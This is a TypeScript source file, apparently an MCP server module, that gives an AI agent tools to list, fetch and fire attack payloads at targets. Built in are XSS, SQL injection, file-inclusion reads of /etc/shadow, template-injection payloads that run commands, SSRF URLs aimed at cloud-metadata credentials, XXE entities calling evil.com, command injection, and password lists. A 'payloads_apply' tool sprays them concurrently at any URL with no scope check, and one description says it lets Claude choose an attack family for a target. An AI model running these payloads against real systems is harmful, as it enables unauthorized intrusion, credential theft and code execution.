import { z } from "zod";
import { hub } from "../browser.js";
import { ToolDef, ok, err } from "../types.js";

const sessionArg = { sessionId: z.string().optional() };

// Curated catalog of well-known payload lists on GitHub raws.
// `builtin` is a small canned set used when offline. `url` is the full raw URL to fetch for the big list.
interface PayloadSource {
  id: string;
  category: string;
  description: string;
  url: string; // GitHub raw URL
  builtin: string[]; // small fallback list, works offline
}

const CATALOG: PayloadSource[] = [
  {
    id: "xss-jhaddix", category: "xss", description: "Jhaddix XSS polyglots and classic payloads (SecLists)",
    url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt",
    builtin: [
      `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
      `"><script>alert(1)</script>`,
      `'><svg onload=alert(1)>`,
      `<img src=x onerror=alert(1)>`,
      `javascript:alert(1)`,
      `<iframe srcdoc="<script>alert(1)</script>">`,
      `<body onload=alert(1)>`,
      `<input onfocus=alert(1) autofocus>`,
      `<marquee onstart=alert(1)>`,
      `"-prompt(1)-"`,
    ],
  },
  {
    id: "xss-payloadallthethings", category: "xss", description: "XSS payloads from PayloadsAllTheThings",
    url: "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Intruders/xss-payload-list.txt",
    builtin: [
      `<script>alert(1)</script>`, `<svg/onload=alert(1)>`, `<img src=1 onerror=alert(1)>`,
      `<details open ontoggle=alert(1)>`, `<a href=javascript:alert(1)>x</a>`,
      `<object data="data:text/html,<script>alert(1)</script>">`, `<embed src=javascript:alert(1)>`,
      `<script\x20type="text/javascript">alert(1);</script>`, `<svg><script>alert(1)</script>`,
    ],
  },
  {
    id: "sqli-generic", category: "sqli", description: "Generic SQLi payloads (SecLists Fuzzing/SQLi)",
    url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt",
    builtin: [
      `'`, `"`, `' OR '1'='1`, `' OR '1'='1'--`, `' OR '1'='1'/*`, `') OR ('1'='1`,
      `admin'--`, `admin' OR 1=1--`, `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`,
      `1' AND SLEEP(5)--`, `1'; WAITFOR DELAY '0:0:5'--`, `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
      `1 OR 1=1`, `' OR 1=1#`, `') OR 1=1--`,
    ],
  },
  {
    id: "sqli-authbypass", category: "sqli", description: "SQLi authentication-bypass payloads",
    url: "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt",
    builtin: [`' OR '1'='1`, `' OR '1'='1'--`, `' OR 1=1#`, `admin'--`, `admin' #`, `admin'/*`, `' or '1'='1`, `') or ('a'='a`, `") or ("1"="1`, `1' or '1' = '1`],
  },
  {
    id: "lfi-linux", category: "lfi", description: "LFI Linux payloads from PayloadsAllTheThings",
    url: "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/LFI-Jhaddix.txt",
    builtin: [
      `/etc/passwd`, `../../../../etc/passwd`, `../../../../../etc/passwd`, `../../../../../../etc/passwd`,
      `..%2f..%2f..%2fetc%2fpasswd`, `....//....//etc/passwd`, `..%252f..%252fetc%252fpasswd`,
      `php://filter/convert.base64-encode/resource=index.php`,
      `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/status`,
      `file:///etc/passwd`, `/etc/shadow`, `/etc/hosts`,
    ],
  },
  {
    id: "lfi-windows", category: "lfi", description: "LFI Windows payloads",
    url: "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Intruders/Windows.txt",
    builtin: [
      `C:\\Windows\\win.ini`, `..\\..\\..\\..\\Windows\\win.ini`, `C:\\boot.ini`,
      `C:\\inetpub\\wwwroot\\web.config`, `..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts`,
    ],
  },
  {
    id: "ssti", category: "ssti", description: "Server-Side Template Injection polyglots and engine-specific",
    url: "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz",
    builtin: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}", "{{7*'7'}}", "${{7*7}}", "{7*7}", "#set($x=7*7)$x", "{{config}}", "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", "${T(java.lang.Runtime).getRuntime().exec('id')}", "{{''.__class__.__mro__[2].__subclasses__()}}"],
  },
  {
    id: "ssrf", category: "ssrf", description: "SSRF canaries (localhost, cloud metadata, etc.)",
    url: "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/Intruder/SSRF-URLs.txt",
    builtin: [
      `http://127.0.0.1`, `http://localhost`, `http://127.0.0.1:22`, `http://[::1]`,
      `http://169.254.169.254/latest/meta-data/`, `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
      `http://metadata.google.internal/computeMetadata/v1/`, `http://100.100.100.200/latest/meta-data/`,
      `file:///etc/passwd`, `gopher://127.0.0.1:6379/_PING`, `dict://127.0.0.1:11211/stats`,
      `http://0.0.0.0`, `http://127.1`, `http://[0:0:0:0:0:ffff:127.0.0.1]`,
    ],
  },
  {
    id: "xxe", category: "xxe", description: "XML External Entity payloads",
    url: "https://raw.githubusercontent.com/payloadbox/xxe-injection-payload-list/master/Intruder/xxe-injection-payload-list.txt",
    builtin: [
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo/>`,
      `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`,
    ],
  },
  {
    id: "open-redirect", category: "open-redirect", description: "Open redirect bypasses",
    url: "https://raw.githubusercontent.com/payloadbox/open-redirect-payload-list/master/Intruder/Open-Redirect-payloads.txt",
    builtin: [`//evil.com`, `//evil.com/`, `/\\evil.com`, `https://evil.com`, `//evil.com@trusted.com`, `/%2f/evil.com`, `//google.com%2F@evil.com`, `javascript://evil.com/%0aalert(1)`, `data:text/html,<script>alert(1)</script>`],
  },
  {
    id: "cmdi", category: "cmdi", description: "Command injection payloads",
    url: "https://raw.githubusercontent.com/payloadbox/command-injection-payload-list/master/Intruder/exploit/command.txt",
    builtin: ["; id", "| id", "`id`", "$(id)", "&& id", "|| id", "; sleep 5", "| sleep 5", "$(sleep 5)", ";ping -c 1 127.0.0.1", "%0a id", "';id;'", "\";id;\"", "\n/bin/id\n"],
  },
  {
    id: "nosqli-mongo", category: "nosqli", description: "MongoDB NoSQL injection payloads",
    url: "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/NoSQL%20Injection/Intruder/NoSQL.txt",
    builtin: [`{"$ne": null}`, `{"$gt": ""}`, `{"$regex": ".*"}`, `{"$where": "sleep(5000)"}`, `[$ne]=`, `[$gt]=`, `[$regex]=.*`, `';return(true);var dummy='`],
  },
  {
    id: "ldap", category: "ldap", description: "LDAP injection payloads",
    url: "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt",
    builtin: [`*`, `*)(&`, `*)(uid=*))(|(uid=*`, `*)(objectClass=*`, `admin*`, `*)(|(password=*))`, `*)(cn=*`],
  },
  {
    id: "wordlist-dir-common", category: "fuzzing", description: "Common directory wordlist (SecLists)",
    url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt",
    builtin: ["admin", "login", "api", "config", "backup", "test", "dev", "staging", "console", "debug", "robots.txt", "sitemap.xml", "server-status", ".env", ".git/HEAD", ".svn/entries", "wp-admin", "phpmyadmin", "adminer.php", "info.php", "phpinfo.php", "web.config", "composer.json", "package.json"],
  },
  {
    id: "wordlist-dir-big", category: "fuzzing", description: "Larger directory wordlist (SecLists big.txt)",
    url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt",
    builtin: [],
  },
  {
    id: "passwords-top-1000", category: "passwords", description: "Top 1000 passwords (SecLists)",
    url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    builtin: ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "696969", "shadow", "master", "666666"],
  },
  {
    id: "usernames-top", category: "usernames", description: "Common usernames",
    url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
    builtin: ["root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser"],
  },
  {
    id: "subdomains-top-5000", category: "subdomains", description: "Top 5000 subdomain names (SecLists)",
    url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt",
    builtin: ["www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old", "lists", "support", "mobile", "mx", "static", "docs", "beta", "shop", "sql", "secure", "demo", "cp", "calendar", "wiki", "web", "media", "email", "images", "img"],
  },
  {
    id: "user-agents", category: "ua", description: "Browser user-agent strings",
    url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/User-Agents/UserAgents.fuzz.txt",
    builtin: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
      "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
      "curl/8.0.1", "wget/1.21.3", "Python-urllib/3.11", "Go-http-client/1.1",
    ],
  },
];

const cache = new Map<string, { fetchedAt: number; payloads: string[]; source: "github" | "builtin" }>();

async function loadPayloads(session: ReturnType<typeof hub.getSession>, src: PayloadSource, forceRefresh = false): Promise<{ payloads: string[]; source: "github" | "builtin"; cached: boolean }> {
  const cacheHit = cache.get(src.id);
  if (!forceRefresh && cacheHit && Date.now() - cacheHit.fetchedAt < 3600_000) return { payloads: cacheHit.payloads, source: cacheHit.source, cached: true };
  try {
    const r = await session.context.request.fetch(src.url, { ignoreHTTPSErrors: true, timeout: 15000 } as any);
    if (r.status() >= 400) throw new Error(`${r.status()}`);
    const text = await r.text();
    const list = text.split(/\r?\n/).map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
    if (!list.length) throw new Error("empty list");
    cache.set(src.id, { fetchedAt: Date.now(), payloads: list, source: "github" });
    return { payloads: list, source: "github", cached: false };
  } catch {
    cache.set(src.id, { fetchedAt: Date.now(), payloads: src.builtin, source: "builtin" });
    return { payloads: src.builtin, source: "builtin", cached: false };
  }
}

export const payloadTools: ToolDef[] = [
  {
    name: "payloads_catalog",
    description: "List every available payload set — categories (xss/sqli/lfi/ssti/ssrf/xxe/open-redirect/cmdi/nosqli/ldap/fuzzing/passwords/usernames/subdomains/ua), their GitHub raw URL, and whether they're cached.",
    schema: z.object({ category: z.string().optional() }),
    handler: async (a) => {
      let list = CATALOG;
      if (a.category) list = list.filter((x) => x.category === a.category);
      return ok(list.map((x) => ({ id: x.id, category: x.category, description: x.description, url: x.url, builtinCount: x.builtin.length, cached: cache.has(x.id), cachedCount: cache.get(x.id)?.payloads.length ?? null })));
    },
  },
  {
    name: "payloads_get",
    description: "Fetch a payload set by id. Pulls fresh from GitHub (raw) and caches for 1 hour; falls back to a curated built-in set if offline. Returns the array of payload strings.",
    schema: z.object({ id: z.string(), refresh: z.boolean().optional(), limit: z.number().int().positive().optional(), ...sessionArg }),
    handler: async (a) => {
      const src = CATALOG.find((x) => x.id === a.id);
      if (!src) return err(`unknown payload id: ${a.id}. Call payloads_catalog to see available.`);
      const s = hub.getSession(a.sessionId);
      const r = await loadPayloads(s, src, a.refresh);
      let out = r.payloads;
      if (a.limit) out = out.slice(0, a.limit);
      return ok({ id: a.id, source: r.source, cached: r.cached, total: r.payloads.length, payloads: out });
    },
  },
  {
    name: "payloads_from_raw_url",
    description: "Fetch a payload list from any GitHub raw URL (or any URL that returns one-per-line text). Caches in-session.",
    schema: z.object({ url: z.string().url(), id: z.string().optional().describe("optional cache id"), limit: z.number().int().positive().optional(), ...sessionArg }),
    handler: async (a) => {
      const s = hub.getSession(a.sessionId);
      const r = await s.context.request.fetch(a.url, { ignoreHTTPSErrors: true, timeout: 20000 } as any);
      if (r.status() >= 400) return err(`${r.status()}`);
      const text = await r.text();
      const list = text.split(/\r?\n/).map((l: string) => l.trim()).filter((l: string) => l && !l.startsWith("#"));
      if (a.id) cache.set(a.id, { fetchedAt: Date.now(), payloads: list, source: "github" });
      let out = list; if (a.limit) out = out.slice(0, a.limit);
      return ok({ url: a.url, total: list.length, payloads: out });
    },
  },
  {
    name: "payloads_search",
    description: "Search within a loaded (or built-in) payload set by regex.",
    schema: z.object({ id: z.string(), pattern: z.string(), limit: z.number().int().positive().optional(), ...sessionArg }),
    handler: async (a) => {
      const src = CATALOG.find((x) => x.id === a.id);
      if (!src) return err(`unknown payload id: ${a.id}`);
      const s = hub.getSession(a.sessionId);
      const r = await loadPayloads(s, src);
      let re: RegExp; try { re = new RegExp(a.pattern, "i"); } catch (e: any) { return err(`bad regex: ${e.message}`); }
      const matches = r.payloads.filter((p: string) => re.test(p)).slice(0, a.limit ?? 50);
      return ok({ id: a.id, matched: matches.length, total: r.payloads.length, payloads: matches });
    },
  },
  {
    name: "payloads_apply",
    description: "Fire every payload from a named set at a target URL parameter and report which ones triggered a different-than-baseline response (status / size / body marker).",
    schema: z.object({
      payloadId: z.string(),
      url: z.string().url(),
      param: z.string(),
      paramLocation: z.enum(["query", "body-form", "body-json", "header"]).optional(),
      method: z.enum(["GET", "POST"]).optional(),
      body: z.string().optional(),
      max: z.number().int().positive().optional(),
      concurrency: z.number().int().positive().optional(),
      successMarker: z.string().optional().describe("regex: a payload that causes this to appear in the response is flagged"),
      ...sessionArg,
    }),
    handler: async (a) => {
      const src = CATALOG.find((x) => x.id === a.payloadId);
      if (!src) return err(`unknown payload id: ${a.payloadId}`);
      const s = hub.getSession(a.sessionId);
      const loaded = await loadPayloads(s, src);
      const payloads = loaded.payloads.slice(0, a.max ?? 100);
      const loc = a.paramLocation ?? "query";
      const method = a.method ?? "GET";
      const marker = a.successMarker ? new RegExp(a.successMarker) : null;

      // Baseline
      let baseStatus = 0, baseLen = 0;
      try {
        const u = new URL(a.url); u.searchParams.set(a.param, "mcpBaseline");
        const r = await s.context.request.fetch(u.toString(), { method, data: a.body, ignoreHTTPSErrors: true });
        baseStatus = r.status(); baseLen = (await r.text().catch(() => "")).length;
      } catch { /* pumppet */ }

      const sub = (payload: string) => {
        let u = a.url, b = a.body; const h: Record<string, string> = {};
        if (loc === "query") { const url = new URL(u); url.searchParams.set(a.param, payload); u = url.toString(); }
        else if (loc === "header") h[a.param] = payload;
        else if (loc === "body-form") { const p = new URLSearchParams(String(b ?? "")); p.set(a.param, payload); b = p.toString(); h["content-type"] = "application/x-www-form-urlencoded"; }
        else if (loc === "body-json") { try { const o = JSON.parse(b ?? "{}"); o[a.param] = payload; b = JSON.stringify(o); } catch { b = JSON.stringify({ [a.param]: payload }); } h["content-type"] = "application/json"; }
        return { url: u, body: b, headers: h };
      };

      const concurrency = Math.min(a.concurrency ?? 6, 15);
      let i = 0; const results: any[] = [];
      const worker = async () => {
        while (i < payloads.length) {
          const payload = payloads[i++];
          const subbed = sub(payload);
          try {
            const t0 = Date.now();
            const r = await s.context.request.fetch(subbed.url, { method, data: subbed.body, headers: subbed.headers, ignoreHTTPSErrors: true, maxRedirects: 0 });
            const text = (await r.text().catch(() => "")).slice(0, 20000);
            const dt = Date.now() - t0;
            const differs = r.status() !== baseStatus || Math.abs(text.length - baseLen) > Math.max(100, baseLen * 0.2);
            const markerHit = marker ? marker.test(text) : false;
            const reflects = text.includes(payload);
            if (differs || markerHit || reflects || dt > 3000) {
              results.push({ payload, status: r.status(), size: text.length, timeMs: dt, markerHit, reflects, snippet: text.slice(0, 300) });
            }
          } catch (e: any) { /* pumppet */ }
        }
      };
      await Promise.all(Array.from({ length: concurrency }, () => worker()));
      return ok({ payloadId: a.payloadId, payloadSource: loaded.source, tried: payloads.length, baseline: { status: baseStatus, size: baseLen }, interesting: results.length, results });
    },
  },
  {
    name: "payloads_pwn_methods",
    description: "List all 'pwn methods' = exploit categories with their payload set id, matching scanner, and github raw source. Lets Claude pick the right attack family for a target.",
    schema: z.object({}),
    handler: async () => ok(CATALOG.map((x) => ({
      category: x.category,
      payloadSetId: x.id,
      description: x.description,
      githubRaw: x.url,
      matchingScanners: ({
        xss: ["scan_xss_reflected", "scan_dom_xss"],
        sqli: ["scan_sqli"],
        lfi: ["scan_lfi", "exploit_lfi_dump_sources"],
        ssti: ["scan_ssti"],
        ssrf: ["scan_ssrf"],
        xxe: [],
        "open-redirect": ["scan_open_redirect"],
        cmdi: ["scan_cmdi_time"],
        nosqli: ["scan_nosql_injection"],
        ldap: [],
        fuzzing: ["scan_directory", "scan_sensitive_files", "routes_backend_probe"],
        passwords: ["hash_crack_dict", "jwt_crack_hs"],
        usernames: ["username_check_batch", "osint_username_sweep"],
        subdomains: ["recon_subdomains_dns"],
        ua: ["browser_set_user_agent"],
      } as any)[x.category] ?? [],
    }))),
  },
];
